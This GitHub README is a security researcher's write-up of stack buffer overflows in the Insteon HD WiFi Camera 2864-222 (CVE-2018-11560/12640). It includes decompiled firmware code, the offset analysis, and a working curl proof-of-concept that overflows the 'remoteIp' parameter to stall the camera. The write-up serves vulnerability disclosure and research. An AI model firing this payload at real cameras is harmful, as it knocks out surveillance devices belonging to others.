=== Content from github.com_78c05075_20250124_234012.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbadnack%2FInsteon_2864-222)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbadnack%2FInsteon_2864-222)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=badnack%2FInsteon_2864-222)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[badnack](/badnack)
/
**[Insteon\_2864-222](/badnack/Insteon_2864-222)**
Public

* [Notifications](/login?return_to=%2Fbadnack%2FInsteon_2864-222) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Fbadnack%2FInsteon_2864-222)
* [Star
   0](/login?return_to=%2Fbadnack%2FInsteon_2864-222)

Insteon WiFI Camera vulnerability writeup

[0
stars](/badnack/Insteon_2864-222/stargazers) [1
fork](/badnack/Insteon_2864-222/forks) [Branches](/badnack/Insteon_2864-222/branches) [Tags](/badnack/Insteon_2864-222/tags) [Activity](/badnack/Insteon_2864-222/activity)
 [Star](/login?return_to=%2Fbadnack%2FInsteon_2864-222)

 [Notifications](/login?return_to=%2Fbadnack%2FInsteon_2864-222) You must be signed in to change notification settings

* [Code](/badnack/Insteon_2864-222)
* [Issues
  1](/badnack/Insteon_2864-222/issues)
* [Pull requests
  0](/badnack/Insteon_2864-222/pulls)
* [Actions](/badnack/Insteon_2864-222/actions)
* [Projects
  0](/badnack/Insteon_2864-222/projects)
* [Security](/badnack/Insteon_2864-222/security)
* [Insights](/badnack/Insteon_2864-222/pulse)

Additional navigation options

* [Code](/badnack/Insteon_2864-222)
* [Issues](/badnack/Insteon_2864-222/issues)
* [Pull requests](/badnack/Insteon_2864-222/pulls)
* [Actions](/badnack/Insteon_2864-222/actions)
* [Projects](/badnack/Insteon_2864-222/projects)
* [Security](/badnack/Insteon_2864-222/security)
* [Insights](/badnack/Insteon_2864-222/pulse)

# badnack/Insteon\_2864-222

    master[Branches](/badnack/Insteon_2864-222/branches)[Tags](/badnack/Insteon_2864-222/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[8 Commits](/badnack/Insteon_2864-222/commits/master/) | | |
| [README.md](/badnack/Insteon_2864-222/blob/master/README.md "README.md") | | [README.md](/badnack/Insteon_2864-222/blob/master/README.md "README.md") |  |  |
| [shark.png](/badnack/Insteon_2864-222/blob/master/shark.png "shark.png") | | [shark.png](/badnack/Insteon_2864-222/blob/master/shark.png "shark.png") |  |  |
| View all files | | |

## Repository files navigation

* README
# Finding 0-days in Insteon HD WiFI Camera 2864-222 (CVE-2018-11560 and CVE-2018-12640)

In this brief blogpost we will exploit the Insteon HD Wifi [Camera](https://www.amazon.com/Insteon-2864-222-HD-Camera-White/dp/B00Q5XRS8S/ref%3Dsr_1_4?s=hi&ie=UTF8&qid=1522359060&sr=1-4&keywords=insteon+wifi+camera), model 2864-222.

Without too much talking, let's start.

## Traffic Analysis

According on the Insteon WiFI camera manual, this camera provides an HTTP web interface, which can be accessed at http://<ip\_camera>:34100.
Though we tried with all the Internet browsers we could think of (Google Chrome, IE, Firefox, Opera and Safari, lynx), we weren't able to log into the camera to see the video stream.
After calling the Insteon support, we were told that the necessary browser plugins to login using a web browser were not maintained anymore. Too bad!

We then opened wireshark to sniff the traffic between the Insteon app and the camera, and we found, as we can see from the picture below, that the HTTP interface was still active and responding.

[![alt text](https://github.com/badnack/Insteon_2864-222/raw/master/shark.png "Wireshark sniffing")](https://github.com/badnack/Insteon_2864-222/blob/master/shark.png)

Note also that, the credentials are transmitted in clear text.
First bad sign.

## Firmware Analysis

We then wanted to get our hands on the firmware mounted on the camera.
After some research, we found that: 1) the camera firmware is publicly avilable, though encrypted and 2) the Insteon camera is a rebrand of Foscam.
With these information in mind, we downloaded the firmware and successfully decrypted it with one of the known Foscam used passwords.
After looking at the contained binary files, it became clear that the camera mounts an ARM architecture.
Among these, we identified the binary named webService, as the binary handling the user-provide requests.

Once opened with the IDA decompiler, we proceeded in finding the function parsing the URIs parameters.

To do this we looked for the known GET keywords we observed during the traffic sniffing phase.
In particular, we looked for the keyword 'usr' as in 'usr=root', and after finding it, we retrieved all the functions refercing such string.
After looking at each one of these function, we found the one we were looking for, whose code is reported below.

```
signed int __fastcall get_value_key(const char *user_URI, const char *key_word, _BYTE *dst_buff)
{
   bool v3; // zf
  signed int counter; // r7
  char *key_val_ptr; // r0
  signed int result; // r0
  const char *assign_ptr; // r5
  signed int assign_len; // r0
  int current_char; // r3
  const char *val_ptr; // r5
  signed int val_len; // r0
  signed int i; // r3
  int c; // r2
  int tmp_buff; // [sp+0h] [bp-98h]

  v3 = key_word == 0;
  if ( key_word )
    v3 = dst_buff == 0;
  if ( v3 )
    return -1;
  counter = 0;
  memset(&tmp_buff, 0, 0x80u);
  strcpy((char *)&tmp_buff, key_word);
  strcat((char *)&tmp_buff, "=");
  key_val_ptr = strstr(user_URI, (const char *)&tmp_buff);
  if ( !key_val_ptr )
  {
    *dst_buff = 0;
    return -1;
  }
  assign_ptr = &key_val_ptr[strlen((const char *)&tmp_buff) - 1];
  assign_len = strlen(assign_ptr);
  do
  {
    if ( counter >= assign_len )
      break;
    current_char = (unsigned __int8)assign_ptr[counter++];
  }
  while ( current_char != '=' );
  val_ptr = &assign_ptr[counter];
  val_len = strlen(val_ptr);
  for ( i = 0; i < val_len; ++i )
  {
    c = (unsigned __int8)val_ptr[i];
    if ( c == '&' )
    {
      dst_buff[i] = 0;
      break;
    }
    dst_buff[i] = c;
  }
  result = 0;
  dst_buff[i] = 0;
  return result;
}
```

As we can see, the above code parses a given URI, searches for the GET key (e.g., 'usr'), skips the '=' characters and finally copy the value associate with the considered key in a provided destination buffer.
The problem here, is that the length of the destination buffer is not provided, let alone check. Therefore, one could potentially provide a value for a the 'usr' key long enough to overwrite any provided destination buffer.
Let's try this out.

First off, we will retrieve the list of the keywords the firmware accepts, by looking for all the cross-references to the above function, and retrieving the passed keywords.
Overall there are **789 different instances** of this function being called, possibly meaning **789 different unique vulnerabilties**.
We only tested and successfully verified only a bunch of them. For space reasons, and because the exploits look all very similar, here I will report only one of them, for which the **CVE-2018-11560** was assigned.
Other bugs related to the GET keywords 'pid', 'pwd' and 'usr' were assigned to **CVE-2018-12640**.

Among the GET keys accepted by the web-server, there is one called 'remoteIp'.
The snippet of the function that retrieves its value, by calling the get\_value\_key function, is reported below:

```
signed int __fastcall executeCGICmd(int a1, const char *a2)
{
  const char *v2; // r4
  int v3; // r8
  int v5; // r0
  char v6; // [sp+14h] [bp-124h]
  char v7; // [sp+54h] [bp-E4h]
  char v8; // [sp+94h] [bp-A4h]
  char s; // [sp+D4h] [bp-64h]
  int v10; // [sp+114h] [bp-24h]

  v2 = a2;
  v3 = a1;
  if ( !a2 )
    return -1;
  memset(&s, 0, 0x40u);
  memset(&v8, 0, 0x40u);
  memset(&v7, 0, 0x40u);
  v10 = 0;
  sub_2830C(v2, &v7);
  sub_282E8(v2, &s);
  sub_282C4(v2, &v8);
  get_value_key_bug(v2, "remoteIp", &v6);
  if ( !sub_52C44((int)&unk_A5A78, &v6) )
  {
  // additional code...
```

As one can see, the destination buffer is defined as big as 64 bytes, which means that if the value provided for the key 'remoteIp' is longer than 64 characters, the function 'get\_value\_key' will overflow the buffer v6.
Moreover, as the last assembly instruction overwrites the value of PC through a pop from the stack (as shown below), one can calculate the offset of the memory value being popped (i.e., the LR register content), and overwrite it with a known value.

```
loc_2907C
ADD     SP, SP, #0x118
LDMFD   SP!, {R4-R10,PC}
; End of function executeCGICmd
```

To easily prove our exaploit and see its effects, we targeted the 'sleep' function.

The final attack is the following:

```
time curl --silent --output /dev/null curl 10.250.250.126:34100/cgi-bin/CGIProxy.fcgi\?cmd=asd\&usr=asd\&pwd=asd\&remoteIp=`python -c "print ('A'*266 + '\x9c\x32')"`
```

The above command, when executed, stalls the camera for no less than 45 second.
During this time the camera stream become unavailable, which for a WiFi camera I would say it's pretty bad, if you ask me.

## About

Insteon WiFI Camera vulnerability writeup

### Resources

[Readme](#readme-ov-file)

[Activity](/badnack/Insteon_2864-222/activity)
### Stars

[**0**
stars](/badnack/Insteon_2864-222/stargazers)
### Watchers

[**2**
watching](/badnack/Insteon_2864-222/watchers)
### Forks

[**1**
fork](/badnack/Insteon_2864-222/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fbadnack%2FInsteon_2864-222&report=badnack+%28user%29)

## [Releases](/badnack/Insteon_2864-222/releases)

No releases published

## [Packages 0](/users/badnack/packages?repo_name=Insteon_2864-222)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


